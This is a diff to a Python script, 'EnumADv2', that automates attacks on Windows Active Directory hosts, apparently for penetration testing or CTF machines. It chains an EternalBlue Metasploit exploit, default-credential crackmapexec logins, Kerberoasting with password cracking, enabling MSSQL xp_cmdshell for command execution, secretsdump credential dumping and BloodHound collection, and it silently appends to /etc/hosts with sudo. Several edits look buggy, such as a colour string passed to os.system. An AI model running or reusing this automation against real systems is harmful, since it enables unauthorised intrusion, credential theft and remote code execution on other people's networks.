@@ -23,16 +23,16 @@ from colorama import Fore
 from pathlib import Path
 from smbprotocol.connection import Connection, Dialects
 
-print("Installing necessary tools if not already installed")
+print("Installing necessary tools if not already installed \n")
 package_name = 'colorama'
 spec = importlib.util.find_spec(package_name)
 if spec is None:
-	print(package_name +" is not installed, installing now")
+	print(package_name +" is not installed, installing now \n")
 	os.system(f"pip3 install {package_name}")
 package_name = 'smbprotocol'
 spec = importlib.util.find_spec(package_name)
 if spec is None:
-	print(package_name +" is not installed, installing now")
+	print(package_name +" is not installed, installing now \n")
 	os.system(f"pip3 install {package_name}")
 
 RED = Fore.RED
@@ -48,8 +48,6 @@ formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 
 parser = argparse.ArgumentParser(description="EnumADv2", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 parser.add_argument("-r", "--RHOST", action="store", help="RHOST")
-parser.add_argument("-p", "--LPORT", action="store", help="LPORT")
-parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
 parser.add_argument("-d", "--DOMAIN", action="store", help="Domain Name")
 parser.add_argument("-u", "--USERNAME", action="store", help="Username")
 parser.add_argument("-P", "--PASSWORD", action="store", help="Password")
@@ -138,7 +136,7 @@ def BLUE():
 				content = f.read()
 				word = "CVE:CVE-2017-0143"
 				if word in content:
-					print(f"{RED}Vulnerable to Eternal Blue{RESET}")
+					print(f"{RED}Vulnerable to Eternal Blue{RESET} \n")
 					os.system(f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set rhost {RHOST}; set lhost {LHOST}; set LPORT {LPORT}; run'")
 
 def SMB():
@@ -210,6 +208,10 @@ def ICE():
 		if word in content:
 			print(f"{MAGENTA}Webserver on port 8000 running, checking service{RESET}")
 			os.system(f"nmap -p 8000 -sC -sV {RHOST} -Pn > http.txt")
+			os.system(f"curl -v http://{RHOST}:8000 >> http.txt")
+			with open ("http.txt", "r") as f:
+				content = f.read()
+				print(content)
 			path="http.txt"
 			with open (path, "r") as f:
 				content = f.read()
@@ -222,14 +224,11 @@ def DOM():
 	if DOMAIN == None:
 		path="ports.txt"
 	with open (path, "r") as f:
-		content = f.read()
-		word="88/tcp"
-		if word in content:
-			print(f"{GREEN}Getting Domain Name for {RHOST}{RESET}")
-			os.system(f"crackmapexec smb {RHOST} -u administrator -p administrator | tail -n 1 | cut -d ']' -f 2 | cut -d '\\' -f 1 | tr -d \" \\t\\n\\r\" | sed -e 's/\x1b\[[0-9;]*m//g'  > domainname.txt")
-			with open ("domainname.txt", "r") as f:
-				content = f.read()
-				print(f"{GREEN}Domain name is {YELLOW}{content} {RESET} \n")
+		print(f"{GREEN}Getting Domain Name for {RHOST}{RESET}")
+		os.system(f"crackmapexec smb {RHOST} -u administrator -p administrator | tail -n 1 | cut -d ']' -f 2 | cut -d '\\' -f 1 | tr -d \" \\t\\n\\r\" | sed -e 's/\x1b\[[0-9;]*m//g'  > domainname.txt")
+		with open ("domainname.txt", "r") as f:
+			content = f.read()
+			print(f"{GREEN}Domain name is {YELLOW}{content} {RESET} \n")
 
 def LDAPSEARCH():
 	path="ports.txt"
@@ -299,6 +298,12 @@ def LDAPDOMAINDUMP():
 	if USERNAME is None and PASSWORD is None:
 		os.system(f"ldapdomaindump ldap://{RHOST}:389")
 	os.chdir('..')
+	path = 'LDAP' 
+	directory = os.listdir(path)
+	if len(directory) == 0:
+		print(f"{RED}User cannot do an LDAPDOMAINDUMP, sorry :( {RESET}")
+	if len(directory) != 0:
+		print(f"{YELLOW}Looks like user was able to do an LDAPDOMAINDUMP, LEEEETTTTTSSSS GOOOOOO")
 
 def KLDAP():
 	content = "ldapusers.txt"
@@ -341,7 +346,7 @@ def KLDAP():
 							with open ("johnpass.txt", "r") as f:
 								content = f.read()
 								print(f"{YELLOW}Kerberostable password is {RED}{content}{RESET} \n")
-							os.system(f"crackmapexec smb {RHOST} -u keruser.txt -p johnpass.txt -X 'whoami'")
+							os.system(f"crackmapexec smb {RHOST} -u keruser.txt -p johnpass.txt -X 'whoami' >> CommandExecution.txt")
 
 def MSSQL():
 	path="ports.txt"
@@ -351,19 +356,14 @@ def MSSQL():
 	if word in content:
 		print(f"{YELLOW}MSSQL is running{RESET}")
 	if USERNAME is not None and PASSWORD is not None:
-		if LHOST is None:
-			LHOST = input("LHOST: \n")
-		print(f"{YELLOW}Trying to obtain NetNTLMv2 Hashes from MSSQL{RESET}")
 		with open ("domainname.txt", "r") as f:
 			y = f.read()
-		respond = input(f"{RED}Start responder in another terminal, press enter to continue{RESET}")
-		os.system(f"sqsh -S {RHOST} -U {USERNAME} -P '{PASSWORD}' -C \"xp_dirtree\" '\\\\{LHOST}\\some\\thing' -c")
-		print(f"{YELLOW}Attempeting to turn on xp_cmdshell{RESET}")
+		print(f"{YELLOW}Attempeting to turn on xp_cmdshell and command execution with crackmapexec{RESET}")
 		os.system(f"sqsh -S {RHOST} -U {USERNAME} -P '{PASSWORD}' -C \"sp_configure 'show advanced options', '1'\" -c")
 		os.system(f"sqsh -S {RHOST} -U {USERNAME} -P '{PASSWORD}' -C \"RECONFIGURE\" -c")
 		os.system(f"sqsh -S {RHOST} -U {USERNAME} -P '{PASSWORD}' -C \"sp_configure 'xp_cmdshell', '1'\" -c")
 		os.system(f"sqsh -S {RHOST} -U {USERNAME} -P '{PASSWORD}' -C \"RECONFIGURE\" -c")
-		os.system(f"crackmapexec mssql {RHOST} -u {USERNAME} -p {PASSWORD} -X whoami")
+		os.system(f"crackmapexec mssql {RHOST} -u {USERNAME} -p {PASSWORD} -X whoami >> CommandExecution.txt")
 		
 def RPC():
 	path="ports.txt"
@@ -371,27 +371,39 @@ def RPC():
 		content = f.read()
 		word="135/tcp"
 		if word in content:
-			print(f"{YELLOW}RPCClient is running, trying anonymous access{RESET}")
+			os.system("touch users1.txt")
 			if USERNAME is None and PASSWORD is None:
+				print(f"{YELLOW}RPCClient is running, trying anonymous access{RESET}")
 				os.system(f'rpcclient -U "" -N {RHOST} -c "enumdomusers" > users1.txt')
-			with open ("users1.txt", "r") as a:
-				content = a.read()
-				word = "Administrator"
-				if word in content:
-					print(f"{GREEN}Anonymous RPC access allowed, making rpcusers.txt file{RESET}")
-					os.system("cut -d '[' -f 2 users1.txt > cut1.txt")
-					os.system("cut -d ']' -f 1 cut1.txt > rpcusers.txt")
-					os.remove("cut1.txt")
-					os.remove("users1.txt")
+				with open ("users1.txt", "r") as a:
+					content = a.read()
+					word = "Administrator"
+					if word in content:
+						print(f"{GREEN}Anonymous RPC access allowed, making rpcusers.txt file{RESET}")
+						os.system("cut -d '[' -f 2 users1.txt > cut1.txt")
+						os.system("cut -d ']' -f 1 cut1.txt > rpcusers.txt")
+						os.remove("cut1.txt")
+						os.remove("users1.txt")
 			if USERNAME is not None and PASSWORD is not None:
 				with open ("domainname.txt", "r") as a:
 					z = a.read()
 				os.system(f"rpcclient -U {z}/{USERNAME}%{PASSWORD} -N {RHOST} -c 'enumdomusers > users1.txt'")
-				os.system("cut -d '[' -f 2 users1.txt > cut1.txt")
-				os.system("cut -d ']' -f 1 cut1.txt > rpcusers.txt")
-				os.remove("cut1.txt")
-				os.remove("users1.txt")
-				print(f"{YELLOW}Created username file under rpcusers.txt{RESET}")
+				with open ("users1.txt", "r") as f:
+					if os.stat('users1.txt').st_size != 0:
+						print(f"{YELLOW}Looks like user can enumerate users through RPC")
+						content = f.read()
+						word = "Administrator"
+						if word in content:
+							os.system(f"{YELLOW}Trying to attack RPC with {USERNAME} and {PASSWORD} domain name {z}")
+							os.system("cut -d '[' -f 2 users1.txt > cut1.txt")
+							os.system("cut -d ']' -f 1 cut1.txt > rpcusers.txt")
+							os.remove("cut1.txt")
+							os.remove("users1.txt")
+							print(f"{YELLOW}Created username file under rpcusers.txt{RESET}")
+					if os.stat('users1.txt').st_size == 0:
+						print(f'{RED}User cannot enumerate users in RPC, sorry{RESET}')
+						os.remove('users1.txt')
+	
 
 def KRPC():
 	content = "rpcusers.txt"
@@ -434,12 +446,13 @@ def KRPC():
 						with open ("johnpass.txt", "r") as f:
 							content = f.read()
 							print(f"{YELLOW}Kerberostable password is {RED}{content}{RESET} \n")
-						os.system(f"crackmapexec smb {RHOST} -u keruser.txt -p johnpass.txt -X 'whoami'")
+						os.system(f"crackmapexec smb {RHOST} -u keruser.txt -p johnpass.txt -X 'whoami' >> CommandExecution.txt")
 
 def IMPACKET():
 	if USERNAME == None and PASSWORD == None and USERSFILE is not None:
-		users = input (f"{RED}Usernames file, if none press enter{RESET}")
-		a = input (f"{RED}Make sure domain name is in /etc/hosts or following attacks will not work")
+		with open ("domainname.txt", "r") as f:
+			y = f.read()
+		os.system(f"sudo echo {RHOST}    {y} >> /etc/hosts")
 		content = users
 		if (os.path.isfile(content) == True):
 			print(f"{YELLOW}{content} file found, trying some things{RESET}")
@@ -458,6 +471,11 @@ def IMPACKET():
 			os.system(f"GetUserSPNs.py {y}/{USERNAME}:{PASSWORD} -request >> impacket.txt")
 			os.system(f"lookupsid.py {y}/{USERNAME}:{PASSWORD}@{y} >> impacket.txt")
 			os.system(f"secretsdump.py {y}/{USERNAME}:{PASSWORD}@{y} > secretsdump.txt")
+	with open ("impacket.txt", "r") as f:
+		content = f.read()
+		print(f"{MAGENTA}Hopefully we got something from impacket, if not... that is ok just keep pushing\n {RESET}")
+		time.sleep(3)
+		print(content)
 
 def CRACKMAPEXEC():
 	if USERNAME is None and PASSWORD is None and USERSFILE is None:
@@ -492,24 +510,38 @@ def CRACKMAPEXEC():
 				word = "Pwn3d!"
 				if word in content:
 					print(f"\n{RED}***Pwn3d! system with {YELLOW}{w}{RED}***{RESET}")
+					time.sleep(3)
 	if USERNAME is not None and PASSWORD is not None:
 		c = "crackmapexec smb"
 		w = "crackmapexec winrm"
 		l = "crackmapexec ldap"
 		path = "crack.txt"
-		os.system(f"{c} {RHOST} -u {USERNAME} -p {PASSWORD} --shares --sessions --loggedon-users --users --pass-pol > {path}")
+		os.system(f"{c} {RHOST} -u {USERNAME} -p {PASSWORD} --shares --groups --sessions --loggedon-users --users --pass-pol > {path}")
 		os.system(f"{l} {RHOST} -u {USERNAME} -p {PASSWORD} --admin-count --trusted-for-delegation --password-not-required --users --groups >> {path}")
 		os.system(f"{w} {RHOST} -u {USERNAME} -p {PASSWORD} -X whoami >> {path}")
-
+		with open (f"crack.txt", "r") as f:
+			content = f.read()
+			print(content)
+			word = "Pwn3d!"
+			if word in content:
+				print(f"{MAGENTA}Pwn3d! something{RESET} \n")
+				os.system("cat crack.txt | grep 'Pwn3d!'")
+				time.sleep(3)
 def BLOOD():
 	if USERNAME is not None and PASSWORD is not None:
-		print(f"{YELLOW}Running Bloodhound with user {USERNAME}{RESET}")
+		print(f"{YELLOW}Running Bloodhound with user {USERNAME} and password {PASSWORD}, if you get errors then user cannot run{RESET} \n")
 		with open ("domainname.txt", "r") as a:
 				z = a.read()
 		os.system("mkdir Blood")
 		os.system("cd Blood")
 		os.system(f"bloodhound-python -u '{USERNAME}' -p '{PASSWORD}' -ns {RHOST} -d {z} -c all")
 		os.system("cd ..")
+		path ='Blood'
+		directory = os.listdir(path)
+		if len(directory) == 0:
+			print(f"{RED}Sorry... User cannot do a bloodhound-python dump :( {RESET} \n")
+		if len(directory) != 0:
+			print(f"{YELLOW}Helllzzzz yessssss... bloodhound-python has been dumped {RESET} \n")
 
 if DOWNLOAD is not False:
 	DOWN()
